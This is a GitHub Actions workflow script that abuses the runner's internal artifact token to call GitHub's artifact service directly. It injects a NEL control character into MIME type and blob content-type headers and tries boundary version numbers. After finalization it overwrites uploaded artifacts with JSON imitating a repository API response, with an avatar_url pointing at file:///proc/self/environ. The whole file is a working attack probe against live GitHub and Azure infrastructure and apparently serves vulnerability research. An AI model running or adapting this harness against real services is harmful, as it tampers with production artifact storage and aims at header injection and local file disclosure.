name: Repo Cassette artifact version matrix

on:
  workflow_dispatch:

permissions:
  actions: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe artifact version gates and final headers
        uses: actions/github-script@v7
        env:
          GITHUB_TOKEN: ${{ github.token }}
        with:
          script: |
            const {createHash} = require('node:crypto');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            if (!token || !resultsUrl) throw new Error('Runtime artifact credentials unavailable');
            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
            const scope = claims.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
            if (!scope) throw new Error('Actions.Results scope missing');
            const [, runId, jobId] = scope.split(':');
            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
            const service = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
            const repo = process.env.GITHUB_REPOSITORY;
            const nel = '\u0085';
            const badMime = `application/json${nel}`;
            const reason = data => String(data?.msg || data?.code || '').slice(0, 100).replace(/https?:\/\/\S+/g, '[url]');
            const cases = [
              [-2147483648, badMime], [-1, badMime], [0, badMime], [1, badMime], [2, badMime],
              [3, badMime], [4, badMime], [5, badMime], [6, badMime], [7, badMime], [8, badMime],
              [9, badMime], [10, badMime], [11, badMime], [127, badMime], [2147483647, badMime],
              [0, undefined], [8, undefined], [9, undefined],
              [2147483647, undefined]
            ];

            async function rpc(method, body) {
              const response = await fetch(service + method, {
                method: 'POST',
                headers: {'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json'},
                body: JSON.stringify(body)
              });
              return {status: response.status, data: await response.json().catch(() => ({}))};
            }

            async function putBlob(url, bytes) {
              const response = await fetch(url, {
                method: 'PUT',
                headers: {
                  'x-ms-blob-type': 'BlockBlob',
                  'x-ms-blob-content-type': `application/json${nel}`,
                  'x-ms-version': '2023-11-03',
                  'Content-Type': 'application/octet-stream'
                }, body: bytes
              });
              if (!response.ok) throw new Error(`Azure status=${response.status} code=${response.headers.get('x-ms-error-code') || 'unknown'}`);
            }

            async function inspect(label, artifactId, expected) {
              const endpoint = `https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`;
              const first = await fetch(endpoint, {
                headers: {
                  'Accept': 'application/vnd.github.v3+json',
                  'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`
                }, redirect: 'manual'
              });
              if (first.status !== 302) {
                core.info(`MIME ${label} artifact_id=${artifactId} api_status=${first.status}`);
                return;
              }
              const location = first.headers.get('location');
              if (!location) throw new Error(`${label} redirect lacked Location`);
              const rsct = new URL(location).searchParams.get('rsct');
              const response = await fetch(location);
              const body = Buffer.from(await response.arrayBuffer());
              const type = response.headers.get('content-type') || '';
              core.info(`MIME ${label} artifact_id=${artifactId} status=${response.status} rsct_utf8_hex=${rsct === null ? 'absent' : Buffer.from(rsct, 'utf8').toString('hex')} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')} body_matches=${body.equals(expected)}`);
            }

            for (const [version, mime] of cases) {
              const label = `v${version < 0 ? 'n' + (-version) : version}_${mime === undefined ? 'missing' : 'nel'}`;
              const name = `version-matrix-${process.env.GITHUB_RUN_ID}-${label}.json`;
              const request = {...ids, name, version};
              if (mime !== undefined) request.mime_type = mime;
              const created = await rpc('CreateArtifact', request);
              core.info(`MIME ${label} create_status=${created.status} ok=${created.data.ok === true} reason=${reason(created.data)}`);
              if (created.status !== 200 || created.data.ok !== true) continue;
              const uploadUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
              if (!uploadUrl) throw new Error(`${label} missing upload URL`);
              const placeholder = Buffer.from('{"probe":"placeholder"}');
              try { await putBlob(uploadUrl, placeholder); }
              catch (error) { core.info(`MIME ${label} upload_error=${String(error.message).slice(0, 80)}`); continue; }
              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
              const finalized = await rpc('FinalizeArtifact', {...ids, name, size: String(placeholder.length), hash});
              core.info(`MIME ${label} finalize_status=${finalized.status} ok=${finalized.data.ok === true} reason=${reason(finalized.data)}`);
              if (finalized.status !== 200 || finalized.data.ok !== true) continue;
              const artifactId = finalized.data.artifact_id || finalized.data.artifactId;
              const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
              const bytes = Buffer.from(JSON.stringify({
                full_name: repository,
                owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                description: label
              }));
              await putBlob(uploadUrl, bytes);
              try { await inspect(label, artifactId, bytes); }
              catch (error) { core.info(`MIME ${label} inspect_error=${String(error.message).slice(0, 100)}`); }
            }
